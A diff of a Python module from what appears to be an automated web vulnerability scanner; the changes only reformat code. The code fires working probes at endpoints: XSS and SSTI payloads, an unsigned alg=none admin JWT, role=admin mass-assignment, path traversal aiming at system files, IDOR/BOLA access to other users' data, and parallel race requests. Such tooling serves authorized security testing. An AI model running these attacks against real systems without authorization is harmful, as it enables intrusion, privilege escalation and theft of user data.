@@ -11,6 +11,7 @@ This is the difference between:
     - Old: probe '/' once and pray
     - New: route SQLi test to /login, SSTI test to /render, etc.
 """
+
 from __future__ import annotations
 
 import asyncio
@@ -25,22 +26,24 @@ from typing import Any, Callable, Dict, List, Optional, Tuple
 import aiohttp
 
 from tools.endpoint_discovery import Endpoint
+
 logger = logging.getLogger("elengenix.targeted")
 
 
 @dataclass
 class ConfirmedFinding:
     """A finding with concrete evidence."""
+
     title: str
     severity: str  # Critical | High | Medium | Low | Informational
     category: str
     endpoint_url: str
     method: str
-    evidence: str               # the actual proof
-    payload: str = ""           # what we sent
+    evidence: str  # the actual proof
+    payload: str = ""  # what we sent
     response_snippet: str = ""  # what we got back
     status_code: int = 0
-    confidence: float = 1.0     # 1.0 = fully confirmed
+    confidence: float = 1.0  # 1.0 = fully confirmed
     detector: str = ""
 
 
@@ -59,7 +62,9 @@ SQLI_PAYLOADS = [
 ]
 
 
-async def test_sql_injection(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
+async def test_sql_injection(
+    session: aiohttp.ClientSession, ep: Endpoint
+) -> List[ConfirmedFinding]:
     """Test for SQL injection on login/auth endpoints."""
     findings: List[ConfirmedFinding] = []
     if ep.method not in ("POST", "PUT") and "login" not in ep.url and "auth" not in ep.url:
@@ -81,48 +86,54 @@ async def test_sql_injection(session: aiohttp.ClientSession, ep: Endpoint) -> Li
                 body = await r.text()
                 # Detection: status changes OR body shows success/data leak
                 if status != baseline_status:
-                    findings.append(ConfirmedFinding(
-                        title=f"SQL Injection ({kind}) on {ep.url}",
-                        severity="Critical",
-                        category="sql_injection",
-                        endpoint_url=ep.url,
-                        method=ep.method,
-                        evidence=f"Baseline status {baseline_status}, payload status {status}",
-                        payload=f"username={payload}",
-                        response_snippet=body[:300],
-                        status_code=status,
-                        detector="TargetedSQLiDetector",
-                    ))
+                    findings.append(
+                        ConfirmedFinding(
+                            title=f"SQL Injection ({kind}) on {ep.url}",
+                            severity="Critical",
+                            category="sql_injection",
+                            endpoint_url=ep.url,
+                            method=ep.method,
+                            evidence=f"Baseline status {baseline_status}, payload status {status}",
+                            payload=f"username={payload}",
+                            response_snippet=body[:300],
+                            status_code=status,
+                            detector="TargetedSQLiDetector",
+                        )
+                    )
                     break
                 elif "ok" in body.lower() and "ok" not in baseline_body.lower():
                     # Body shows success after injection but baseline failed
-                    findings.append(ConfirmedFinding(
-                        title=f"SQL Injection ({kind}) - auth bypass on {ep.url}",
-                        severity="Critical",
-                        category="sql_injection",
-                        endpoint_url=ep.url,
-                        method=ep.method,
-                        evidence=f"Auth bypassed: {body[:200]}",
-                        payload=f"username={payload}",
-                        response_snippet=body[:300],
-                        status_code=status,
-                        detector="TargetedSQLiDetector",
-                    ))
+                    findings.append(
+                        ConfirmedFinding(
+                            title=f"SQL Injection ({kind}) - auth bypass on {ep.url}",
+                            severity="Critical",
+                            category="sql_injection",
+                            endpoint_url=ep.url,
+                            method=ep.method,
+                            evidence=f"Auth bypassed: {body[:200]}",
+                            payload=f"username={payload}",
+                            response_snippet=body[:300],
+                            status_code=status,
+                            detector="TargetedSQLiDetector",
+                        )
+                    )
                     break
                 # Detect query reflection (debug echo)
                 elif "SELECT" in body.upper() and "SELECT" not in baseline_body.upper():
-                    findings.append(ConfirmedFinding(
-                        title=f"SQL Injection - query reflection on {ep.url}",
-                        severity="Critical",
-                        category="sql_injection",
-                        endpoint_url=ep.url,
-                        method=ep.method,
-                        evidence="Query string reflected in response (debug leak)",
-                        payload=f"username={payload}",
-                        response_snippet=body[:300],
-                        status_code=status,
-                        detector="TargetedSQLiDetector",
-                    ))
+                    findings.append(
+                        ConfirmedFinding(
+                            title=f"SQL Injection - query reflection on {ep.url}",
+                            severity="Critical",
+                            category="sql_injection",
+                            endpoint_url=ep.url,
+                            method=ep.method,
+                            evidence="Query string reflected in response (debug leak)",
+                            payload=f"username={payload}",
+                            response_snippet=body[:300],
+                            status_code=status,
+                            detector="TargetedSQLiDetector",
+                        )
+                    )
                     break
         except Exception:
             continue
@@ -135,7 +146,7 @@ async def test_sql_injection(session: aiohttp.ClientSession, ep: Endpoint) -> Li
 
 XSS_PAYLOADS = [
     "<script>alert(1)</script>",
-    "\"><svg onload=alert(1)>",
+    '"><svg onload=alert(1)>',
     "<img src=x onerror=alert(1)>",
     "javascript:alert(1)",
 ]
@@ -155,18 +166,20 @@ async def test_xss(session: aiohttp.ClientSession, ep: Endpoint) -> List[Confirm
                 body = await r.text()
                 ct = r.headers.get("content-type", "")
                 if "html" in ct and payload in body:
-                    findings.append(ConfirmedFinding(
-                        title=f"Reflected XSS on {ep.url}",
-                        severity="High",
-                        category="xss_reflected",
-                        endpoint_url=ep.url,
-                        method=ep.method,
-                        evidence=f"Payload '{payload[:40]}' reflected unescaped in HTML response",
-                        payload=f"q={payload}",
-                        response_snippet=body[:300],
-                        status_code=r.status,
-                        detector="TargetedXSSDetector",
-                    ))
+                    findings.append(
+                        ConfirmedFinding(
+                            title=f"Reflected XSS on {ep.url}",
+                            severity="High",
+                            category="xss_reflected",
+                            endpoint_url=ep.url,
+                            method=ep.method,
+                            evidence=f"Payload '{payload[:40]}' reflected unescaped in HTML response",
+                            payload=f"q={payload}",
+                            response_snippet=body[:300],
+                            status_code=r.status,
+                            detector="TargetedXSSDetector",
+                        )
+                    )
                     break
         except Exception:
             continue
@@ -199,18 +212,20 @@ async def test_ssti(session: aiohttp.ClientSession, ep: Endpoint) -> List[Confir
             async with session.get(test_url) as r:
                 body = await r.text()
                 if indicator in body:
-                    findings.append(ConfirmedFinding(
-                        title=f"Server-Side Template Injection on {ep.url}",
-                        severity="Critical",
-                        category="ssti",
-                        endpoint_url=ep.url,
-                        method=ep.method,
-                        evidence=f"Expression '{payload}' evaluated to '{indicator}'",
-                        payload=f"template={payload}",
-                        response_snippet=body[:300],
-                        status_code=r.status,
-                        detector="TargetedSSTIDetector",
-                    ))
+                    findings.append(
+                        ConfirmedFinding(
+                            title=f"Server-Side Template Injection on {ep.url}",
+                            severity="Critical",
+                            category="ssti",
+                            endpoint_url=ep.url,
+                            method=ep.method,
+                            evidence=f"Expression '{payload}' evaluated to '{indicator}'",
+                            payload=f"template={payload}",
+                            response_snippet=body[:300],
+                            status_code=r.status,
+                            detector="TargetedSSTIDetector",
+                        )
+                    )
                     break
         except Exception:
             continue
@@ -221,6 +236,7 @@ async def test_ssti(session: aiohttp.ClientSession, ep: Endpoint) -> List[Confir
 # IDOR TEST
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 async def test_idor(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
     """Test for IDOR by accessing other users' resources."""
     findings: List[ConfirmedFinding] = []
@@ -228,7 +244,7 @@ async def test_idor(session: aiohttp.ClientSession, ep: Endpoint) -> List[Confir
     # If URL ends with /<digit>, try other digits
     last_seg = ep.url.rstrip("/").split("/")[-1]
     if last_seg.isdigit():
-        base = ep.url.rstrip("/")[:-len(last_seg)]
+        base = ep.url.rstrip("/")[: -len(last_seg)]
         for uid in (1, 2, 3, 99):
             if str(uid) == last_seg:
                 continue
@@ -238,18 +254,20 @@ async def test_idor(session: aiohttp.ClientSession, ep: Endpoint) -> List[Confir
                     if r.status == 200:
                         body = await r.text()
                         if "id" in body.lower() or "user" in body.lower() or "name" in body.lower():
-                            findings.append(ConfirmedFinding(
-                                title=f"IDOR - access user {uid} via {ep.url}",
-                                severity="High",
-                                category="idor",
-                                endpoint_url=test_url,
-                                method="GET",
-                                evidence=f"User {uid} accessible without authentication (substituted from {last_seg})",
-                                payload=f"GET {test_url}",
-                                response_snippet=body[:300],
-                                status_code=r.status,
-                                detector="TargetedIDORDetector",
-                            ))
+                            findings.append(
+                                ConfirmedFinding(
+                                    title=f"IDOR - access user {uid} via {ep.url}",
+                                    severity="High",
+                                    category="idor",
+                                    endpoint_url=test_url,
+                                    method="GET",
+                                    evidence=f"User {uid} accessible without authentication (substituted from {last_seg})",
+                                    payload=f"GET {test_url}",
+                                    response_snippet=body[:300],
+                                    status_code=r.status,
+                                    detector="TargetedIDORDetector",
+                                )
+                            )
                             return findings
             except Exception:
                 continue
@@ -260,7 +278,10 @@ async def test_idor(session: aiohttp.ClientSession, ep: Endpoint) -> List[Confir
 # MASS ASSIGNMENT TEST
 # ═══════════════════════════════════════════════════════════════════════════
 
-async def test_mass_assignment(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
+
+async def test_mass_assignment(
+    session: aiohttp.ClientSession, ep: Endpoint
+) -> List[ConfirmedFinding]:
     """Test for mass assignment via role/admin escalation."""
     findings: List[ConfirmedFinding] = []
     if ep.method not in ("POST", "PUT"):
@@ -284,18 +305,20 @@ async def test_mass_assignment(session: aiohttp.ClientSession, ep: Endpoint) -> 
                 try:
                     j = json.loads(body)
                     if j.get("role") == "admin" or j.get("balance") == 99999:
-                        findings.append(ConfirmedFinding(
-                            title=f"Mass Assignment - privilege escalation on {ep.url}",
-                            severity="Critical",
-                            category="mass_assignment",
-                            endpoint_url=ep.url,
-                            method=ep.method,
-                            evidence=f"role=admin accepted, balance=99999 accepted",
-                            payload=json.dumps(test_data),
-                            response_snippet=body[:300],
-                            status_code=r.status,
-                            detector="TargetedMassAssignmentDetector",
-                        ))
+                        findings.append(
+                            ConfirmedFinding(
+                                title=f"Mass Assignment - privilege escalation on {ep.url}",
+                                severity="Critical",
+                                category="mass_assignment",
+                                endpoint_url=ep.url,
+                                method=ep.method,
+                                evidence=f"role=admin accepted, balance=99999 accepted",
+                                payload=json.dumps(test_data),
+                                response_snippet=body[:300],
+                                status_code=r.status,
+                                detector="TargetedMassAssignmentDetector",
+                            )
+                        )
                 except Exception:
                     pass
     except Exception:
@@ -307,6 +330,7 @@ async def test_mass_assignment(session: aiohttp.ClientSession, ep: Endpoint) -> 
 # JWT ALG=NONE TEST
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 async def test_jwt_alg_none(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
     """Test for JWT alg=none acceptance."""
     findings: List[ConfirmedFinding] = []
@@ -314,8 +338,17 @@ async def test_jwt_alg_none(session: aiohttp.ClientSession, ep: Endpoint) -> Lis
         return findings
 
     import base64
-    header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
-    payload = base64.urlsafe_b64encode(json.dumps({"user": "admin", "role": "admin"}).encode()).rstrip(b"=").decode()
+
+    header = (
+        base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
+        .rstrip(b"=")
+        .decode()
+    )
+    payload = (
+        base64.urlsafe_b64encode(json.dumps({"user": "admin", "role": "admin"}).encode())
+        .rstrip(b"=")
+        .decode()
+    )
     none_token = f"{header}.{payload}."  # empty signature
 
     try:
@@ -324,18 +357,20 @@ async def test_jwt_alg_none(session: aiohttp.ClientSession, ep: Endpoint) -> Lis
             try:
                 j = json.loads(body)
                 if j.get("valid") is True or "payload" in j:
-                    findings.append(ConfirmedFinding(
-                        title=f"JWT alg=none accepted on {ep.url}",
-                        severity="Critical",
-                        category="jwt_confusion",
-                        endpoint_url=ep.url,
-                        method=ep.method,
-                        evidence=f"alg=none token with role=admin accepted as valid",
-                        payload=f"token={none_token[:50]}...",
-                        response_snippet=body[:300],
-                        status_code=r.status,
-                        detector="TargetedJWTDetector",
-                    ))
+                    findings.append(
+                        ConfirmedFinding(
+                            title=f"JWT alg=none accepted on {ep.url}",
+                            severity="Critical",
+                            category="jwt_confusion",
+                            endpoint_url=ep.url,
+                            method=ep.method,
+                            evidence=f"alg=none token with role=admin accepted as valid",
+                            payload=f"token={none_token[:50]}...",
+                            response_snippet=body[:300],
+                            status_code=r.status,
+                            detector="TargetedJWTDetector",
+                        )
+                    )
             except Exception:
                 pass
     except Exception:
@@ -347,7 +382,10 @@ async def test_jwt_alg_none(session: aiohttp.ClientSession, ep: Endpoint) -> Lis
 # PROTOTYPE POLLUTION TEST
 # ═══════════════════════════════════════════════════════════════════════════
 
-async def test_proto_pollution(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
+
+async def test_proto_pollution(
+    session: aiohttp.ClientSession, ep: Endpoint
+) -> List[ConfirmedFinding]:
     """Test for prototype pollution via __proto__ or constructor.prototype."""
     findings: List[ConfirmedFinding] = []
     if ep.method != "POST":
@@ -358,18 +396,20 @@ async def test_proto_pollution(session: aiohttp.ClientSession, ep: Endpoint) -> 
         async with session.post(ep.url, json=test_payload) as r:
             body = await r.text()
             if "__proto__" in body or "polluted" in body:
-                findings.append(ConfirmedFinding(
-                    title=f"Prototype Pollution on {ep.url}",
-                    severity="Critical",
-                    category="prototype_pollution",
-                    endpoint_url=ep.url,
-                    method=ep.method,
-                    evidence="__proto__ keys accepted and reflected in response",
-                    payload=json.dumps(test_payload),
-                    response_snippet=body[:300],
-                    status_code=r.status,
-                    detector="TargetedProtoPollutionDetector",
-                ))
+                findings.append(
+                    ConfirmedFinding(
+                        title=f"Prototype Pollution on {ep.url}",
+                        severity="Critical",
+                        category="prototype_pollution",
+                        endpoint_url=ep.url,
+                        method=ep.method,
+                        evidence="__proto__ keys accepted and reflected in response",
+                        payload=json.dumps(test_payload),
+                        response_snippet=body[:300],
+                        status_code=r.status,
+                        detector="TargetedProtoPollutionDetector",
+                    )
+                )
     except Exception:
         pass
     return findings
@@ -379,7 +419,10 @@ async def test_proto_pollution(session: aiohttp.ClientSession, ep: Endpoint) -> 
 # PATH TRAVERSAL TEST
 # ═══════════════════════════════════════════════════════════════════════════
 
-async def test_path_traversal(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
+
+async def test_path_traversal(
+    session: aiohttp.ClientSession, ep: Endpoint
+) -> List[ConfirmedFinding]:
     """Test for path traversal in file params."""
     findings: List[ConfirmedFinding] = []
     if ep.method != "GET":
@@ -393,18 +436,20 @@ async def test_path_traversal(session: aiohttp.ClientSession, ep: Endpoint) -> L
                 async with session.get(test_url) as r:
                     body = await r.text()
                     if ("root:" in body) or ("[extensions]" in body):
-                        findings.append(ConfirmedFinding(
-                            title=f"Path Traversal on {ep.url} via {param}",
-                            severity="Critical",
-                            category="path_traversal",
-                            endpoint_url=ep.url,
-                            method=ep.method,
-                            evidence=f"Read sensitive file via {param}={payload}",
-                            payload=f"{param}={payload}",
-                            response_snippet=body[:300],
-                            status_code=r.status,
-                            detector="TargetedPathTraversalDetector",
-                        ))
+                        findings.append(
+                            ConfirmedFinding(
+                                title=f"Path Traversal on {ep.url} via {param}",
+                                severity="Critical",
+                                category="path_traversal",
+                                endpoint_url=ep.url,
+                                method=ep.method,
+                                evidence=f"Read sensitive file via {param}={payload}",
+                                payload=f"{param}={payload}",
+                                response_snippet=body[:300],
+                                status_code=r.status,
+                                detector="TargetedPathTraversalDetector",
+                            )
+                        )
                         return findings
             except Exception:
                 continue
@@ -415,7 +460,10 @@ async def test_path_traversal(session: aiohttp.ClientSession, ep: Endpoint) -> L
 # RACE CONDITION TEST
 # ═══════════════════════════════════════════════════════════════════════════
 
-async def test_race_condition(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
+
+async def test_race_condition(
+    session: aiohttp.ClientSession, ep: Endpoint
+) -> List[ConfirmedFinding]:
     """Test for race condition by sending parallel requests to single-use endpoints."""
     findings: List[ConfirmedFinding] = []
     if ep.method != "POST":
@@ -434,19 +482,21 @@ async def test_race_condition(session: aiohttp.ClientSession, ep: Endpoint) -> L
     # If many parallel "different" requests all succeed (when they shouldn't due to
     # single-use constraints) we report. Without state we just report parallel success count.
     if successes >= 5:
-        findings.append(ConfirmedFinding(
-            title=f"Possible Race Condition on {ep.url}",
-            severity="Medium",
-            category="race_condition",
-            endpoint_url=ep.url,
-            method=ep.method,
-            evidence=f"{successes}/8 parallel requests succeeded (concurrent processing possible)",
-            payload="8 parallel POSTs",
-            response_snippet=f"{successes} successes",
-            status_code=200,
-            confidence=0.6,
-            detector="TargetedRaceDetector",
-        ))
+        findings.append(
+            ConfirmedFinding(
+                title=f"Possible Race Condition on {ep.url}",
+                severity="Medium",
+                category="race_condition",
+                endpoint_url=ep.url,
+                method=ep.method,
+                evidence=f"{successes}/8 parallel requests succeeded (concurrent processing possible)",
+                payload="8 parallel POSTs",
+                response_snippet=f"{successes} successes",
+                status_code=200,
+                confidence=0.6,
+                detector="TargetedRaceDetector",
+            )
+        )
     return findings
 
 
@@ -454,8 +504,11 @@ async def test_race_condition(session: aiohttp.ClientSession, ep: Endpoint) -> L
 # ORCHESTRATOR: route the right test to the right endpoint
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 # Endpoint keyword → test functions
-async def test_idor_with_template(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
+async def test_idor_with_template(
+    session: aiohttp.ClientSession, ep: Endpoint
+) -> List[ConfirmedFinding]:
     """Test IDOR on user endpoints like /api/user/<id> by trying /1, /2, /3."""
     findings: List[ConfirmedFinding] = []
     for uid in (1, 2, 3):
@@ -465,18 +518,20 @@ async def test_idor_with_template(session: aiohttp.ClientSession, ep: Endpoint) 
                 if r.status == 200:
                     body = await r.text()
                     if "id" in body.lower() and ("user" in body.lower() or "name" in body.lower()):
-                        findings.append(ConfirmedFinding(
-                            title=f"IDOR - access user {uid} via {ep.url}",
-                            severity="High",
-                            category="idor",
-                            endpoint_url=test_url,
-                            method="GET",
-                            evidence=f"Resource {uid} accessible without authentication",
-                            payload=f"GET {test_url}",
-                            response_snippet=body[:300],
-                            status_code=r.status,
-                            detector="TargetedIDORDetector",
-                        ))
+                        findings.append(
+                            ConfirmedFinding(
+                                title=f"IDOR - access user {uid} via {ep.url}",
+                                severity="High",
+                                category="idor",
+                                endpoint_url=test_url,
+                                method="GET",
+                                evidence=f"Resource {uid} accessible without authentication",
+                                payload=f"GET {test_url}",
+                                response_snippet=body[:300],
+                                status_code=r.status,
+                                detector="TargetedIDORDetector",
+                            )
+                        )
                         return findings
         except Exception:
             continue
@@ -495,18 +550,20 @@ async def test_stored_xss(session: aiohttp.ClientSession, ep: Endpoint) -> List[
         async with session.get(ep.url) as r:
             body = await r.text()
             if payload in body:
-                findings.append(ConfirmedFinding(
-                    title=f"Stored XSS on {ep.url}",
-                    severity="High",
-                    category="xss_stored",
-                    endpoint_url=ep.url,
-                    method=ep.method,
-                    evidence=f"Payload persisted and reflected in GET response",
-                    payload=f"content={payload}",
-                    response_snippet=body[:300],
-                    status_code=r.status,
-                    detector="TargetedStoredXSSDetector",
-                ))
+                findings.append(
+                    ConfirmedFinding(
+                        title=f"Stored XSS on {ep.url}",
+                        severity="High",
+                        category="xss_stored",
+                        endpoint_url=ep.url,
+                        method=ep.method,
+                        evidence=f"Payload persisted and reflected in GET response",
+                        payload=f"content={payload}",
+                        response_snippet=body[:300],
+                        status_code=r.status,
+                        detector="TargetedStoredXSSDetector",
+                    )
+                )
     except Exception:
         pass
     return findings
@@ -529,20 +586,26 @@ async def run_targeted_attacks(
     # Build routes here (after all test functions defined)
     routes = [
         (lambda ep: "login" in ep.url or "/auth" in ep.url, [test_sql_injection]),
-        (lambda ep: "register" in ep.url or "signup" in ep.url,
-         [test_mass_assignment, test_sql_injection]),
+        (
+            lambda ep: "register" in ep.url or "signup" in ep.url,
+            [test_mass_assignment, test_sql_injection],
+        ),
         (lambda ep: "search" in ep.url or "query" in ep.url, [test_xss]),
         (lambda ep: "render" in ep.url or "template" in ep.url, [test_ssti]),
         (lambda ep: "user" in ep.url and ep.url.rstrip("/").split("/")[-1].isdigit(), [test_idor]),
-        (lambda ep: ("user/" in ep.url or "users/" in ep.url)
-                    and not ep.url.rstrip("/").split("/")[-1].isdigit(),
-         [test_idor_with_template]),
+        (
+            lambda ep: ("user/" in ep.url or "users/" in ep.url)
+            and not ep.url.rstrip("/").split("/")[-1].isdigit(),
+            [test_idor_with_template],
+        ),
         (lambda ep: "jwt" in ep.url or "verify" in ep.url, [test_jwt_alg_none]),
         (lambda ep: "merge" in ep.url or "update" in ep.url, [test_proto_pollution]),
         (lambda ep: "download" in ep.url or "file" in ep.url, [test_path_traversal]),
         (lambda ep: "coupon" in ep.url or "redeem" in ep.url, [test_race_condition]),
-        (lambda ep: ep.method == "POST" and ("comment" in ep.url or "post" in ep.url),
-         [test_stored_xss]),
+        (
+            lambda ep: ep.method == "POST" and ("comment" in ep.url or "post" in ep.url),
+            [test_stored_xss],
+        ),
     ]
 
     sem = asyncio.Semaphore(concurrency)
@@ -583,9 +646,7 @@ async def run_targeted_attacks(
         # AUTHENTICATED TESTING: BOLA with two sessions
         if auth_sessions and len(auth_sessions) >= 2:
             try:
-                bola_findings = await run_authenticated_bola(
-                    session, endpoints, auth_sessions
-                )
+                bola_findings = await run_authenticated_bola(session, endpoints, auth_sessions)
                 all_findings.extend(bola_findings)
             except Exception as e:
                 logger.warning("authenticated BOLA failed: %s", e)
@@ -599,8 +660,9 @@ async def run_targeted_attacks(
             seen.add(key)
             unique.append(f)
 
-    logger.info("Targeted attacks: %d confirmed findings (from %d endpoints)",
-                len(unique), len(endpoints))
+    logger.info(
+        "Targeted attacks: %d confirmed findings (from %d endpoints)", len(unique), len(endpoints)
+    )
     return unique
 
 
@@ -668,7 +730,9 @@ async def run_authenticated_bola(
             victim_url = f"{user_template_url}/{victim_id}"
             try:
                 headers = attacker_auth.auth_headers()
-                async with session.get(victim_url, headers=headers, cookies=attacker_auth.cookies) as r:
+                async with session.get(
+                    victim_url, headers=headers, cookies=attacker_auth.cookies
+                ) as r:
                     if r.status != 200:
                         continue
                     body = await r.text()
@@ -677,22 +741,24 @@ async def run_authenticated_bola(
                     returned_user = data.get("username")
                     # BOLA: got VICTIM's user data via authenticated request
                     if returned_id == victim_id and victim_id != attacker_own_id:
-                        findings.append(ConfirmedFinding(
-                            title=f"BOLA - user '{attacker_auth.username}' accessed user '{returned_user}' data",
-                            severity="Critical",
-                            category="bola",
-                            endpoint_url=victim_url,
-                            method="GET",
-                            evidence=(
-                                f"Authenticated as '{attacker_auth.username}' (id={attacker_own_id}) "
-                                f"but accessed user id={victim_id} (username={returned_user}) data via "
-                                f"{victim_url}. No ownership check enforced."
-                            ),
-                            payload=f"GET {victim_url} with session_{attacker_auth.username}",
-                            response_snippet=f"Saw: {body[:200]}",
-                            status_code=r.status,
-                            detector="AuthenticatedBOLADetector",
-                        ))
+                        findings.append(
+                            ConfirmedFinding(
+                                title=f"BOLA - user '{attacker_auth.username}' accessed user '{returned_user}' data",
+                                severity="Critical",
+                                category="bola",
+                                endpoint_url=victim_url,
+                                method="GET",
+                                evidence=(
+                                    f"Authenticated as '{attacker_auth.username}' (id={attacker_own_id}) "
+                                    f"but accessed user id={victim_id} (username={returned_user}) data via "
+                                    f"{victim_url}. No ownership check enforced."
+                                ),
+                                payload=f"GET {victim_url} with session_{attacker_auth.username}",
+                                response_snippet=f"Saw: {body[:200]}",
+                                status_code=r.status,
+                                detector="AuthenticatedBOLADetector",
+                            )
+                        )
                         return findings
             except Exception as e:
                 logger.debug("BOLA test on %s: %s", victim_url, e)
